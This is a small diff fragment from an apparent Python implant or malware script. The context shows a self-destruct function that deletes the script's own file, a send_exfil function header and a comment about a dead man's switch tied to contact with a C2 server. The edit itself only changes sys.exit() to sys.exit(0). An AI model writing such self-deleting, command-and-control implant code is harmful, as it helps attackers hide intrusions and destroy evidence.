@@ -49,7 +49,7 @@ def send_exfil(data):
 #function to self destruct
 def self_destruct():
     remove(argv[0])
-    sys.exit()
+    sys.exit(0)
 
 #Dead man's switch to auto delete after 10 hours of running with no contact from the C2
 def check_time(start_time):
